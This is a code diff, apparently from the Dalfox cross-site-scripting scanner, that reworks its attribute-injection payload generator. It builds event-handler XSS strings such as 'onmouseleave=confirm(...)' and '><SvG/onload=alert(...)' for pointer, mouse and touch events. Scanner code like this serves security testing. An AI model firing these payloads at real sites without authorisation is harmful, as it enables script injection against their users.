@@ -215,16 +215,49 @@ func getHTMLPayload(ip string) []string {
 // getAttrPayload is is return xss
 func getAttrPayload(ip string) []string {
 	payload := []string{
-		"onmouseleave=confirm(DALFOX_ALERT_VALUE) class=dalfox ",
-		"><SvG/onload=alert(DALFOX_ALERT_VALUE) class=dalfox> ",
-		"</ScriPt><sCripT class=dalfox>alert(DALFOX_ALERT_VALUE)</sCriPt>",
 		"onpointerenter=prompt`DALFOX_ALERT_VALUE` class=dalfox ",
-		"onmouseleave=confirm(DALFOX_ALERT_VALUE) id=dalfox ",
-		"/class=dalfox ",
-		"/id=dalfox ",
-		"/class=dalfox",
-		"/id=dalfox",
+		"onmouseleave=confirm(DALFOX_ALERT_VALUE) class=dalfox ",
 	}
+	majorHandler := []string{
+		"onmouseover",
+		"onmouseenter",
+		"onmouseleave",
+		"onmouseenter",
+		"onmouseenter",
+		"onpointerover",
+		"onpointerdown",
+		"onpointerenter",
+		"onpointerleave",
+		"onpointermove",
+		"onpointerout",
+		"onpointerup",
+		"ontouchstart",
+		"ontouchend",
+		"ontouchmove",
+	}
+	for _, mh := range majorHandler {
+		payload = append(payload, mh+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, mh+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, mh+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
+	}
+
+	// set html base payloads
+	hp := getHTMLPayload("")
+	for _, h := range hp {
+		payload = append(payload, ">"+h)
+	}
+
+	// Set all event handler base payloads
+	// However, the payload must be validated and applied.
+	/*
+		eh := GetEventHandlers()
+		for _, e := range eh {
+		payload = append(payload, e+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, e+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
+		payload = append(payload, e+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
+		//}
+	*/
+
 	if strings.Contains(ip, "none") {
 		return payload
 	}
